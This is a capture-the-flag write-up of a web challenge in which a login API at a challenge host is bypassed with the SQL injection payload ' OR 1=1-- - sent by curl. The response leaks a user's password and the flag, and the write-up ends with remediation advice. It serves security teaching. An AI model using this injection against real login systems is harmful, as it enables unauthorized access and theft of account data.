# Doctor Appointment (DEADFACE CTF 2026)

**Category:** Web  
**Points:** 50 
**Author:** @RP-01?  
**Target:** `http://45.79.200.170:3000/`

## Challenge Description

Web applications are tricky these days, and we are seeing an influx of vibe-coded platforms. The objective was to gain access to the website without blindly brute-forcing credentials.

The challenge specifically hinted at checking **GhostTown** for potential resources and warned against excessive login attempts.

## 1. Initial Reconnaissance

Upon visiting the target website, I found a login page for **Health Spark Employer & Benefits Portal**.

Reviewing the page source revealed an interesting JavaScript implementation. The application sent login requests to:

```http
POST /api/login
Content-Type: application/json
```

The request contained two parameters:

```json
{
  "username": "test",
  "password": "test"
}
```

An interesting comment in the frontend JavaScript mentioned that SQL injection could return an HTTP 200 response without issuing a session token.

It also suggested that the response body might contain more information than the UI displayed.

This was a strong indication that the login endpoint could be vulnerable to SQL Injection.

## 2. Testing the Login Endpoint

First, I submitted ordinary test credentials to understand the server's response.

```bash
curl -i -X POST http://45.79.200.170:3000/api/login \
-H "Content-Type: application/json" \
-d '{"username":"test","password":"test"}'
```

The server returned:

```http
HTTP/1.1 401 Unauthorized
```

```json
{
  "error": "Invalid credentials",
  "message": "DO NOT BRUTE FORCE! Failed logins are rate-limited and logged."
}
```

This confirmed that invalid login attempts were rejected and rate-limited.

## 3. Exploiting SQL Injection

Based on the source-code hint, I tested a basic SQL injection payload in the username field:

```sql
' OR 1=1-- -
```

The request:

```bash
curl -i -X POST http://45.79.200.170:3000/api/login \
-H "Content-Type: application/json" \
-d '{"username":"'\'' OR 1=1-- -","password":"test"}'
```

Surprisingly, the server returned:

```http
HTTP/1.1 200 OK
```

Instead of issuing a session token, the response contained additional information:

```json
{
  "message": "Login failed. That's weird... check the network traffic!",
  "username": "john.smith",
  "name": "John Smith",
  "role": "user",
  "departmentid": 10685,
  "password": "Locked_In_And_Ready",
  "flag": "deadface{typical_and_classic}"
}
```

The SQL injection successfully triggered a sensitive information disclosure.

Interestingly, the frontend was designed to display only the error message when no authentication token was returned. However, inspecting the raw HTTP response revealed the actual flag.

## 4. Flag

```text
deadface{typical_and_classic}
```

## 5. Vulnerability Analysis

The challenge demonstrated a SQL Injection vulnerability in the authentication endpoint.

The application improperly handled user-controlled input in its database query, allowing the authentication logic to be manipulated.

Additionally, the backend exposed sensitive database information, including usernames, passwords, department information, and the CTF flag, in its HTTP response.

### Security Recommendations

- Use parameterized SQL queries or prepared statements.
- Never concatenate user input directly into SQL queries.
- Avoid returning sensitive database records in authentication responses.
- Implement proper authentication and authorization checks.
- Apply rate limiting and secure error handling.

**Conclusion:** A simple SQL injection payload was enough to bypass the intended login logic and retrieve sensitive information directly from the API response.
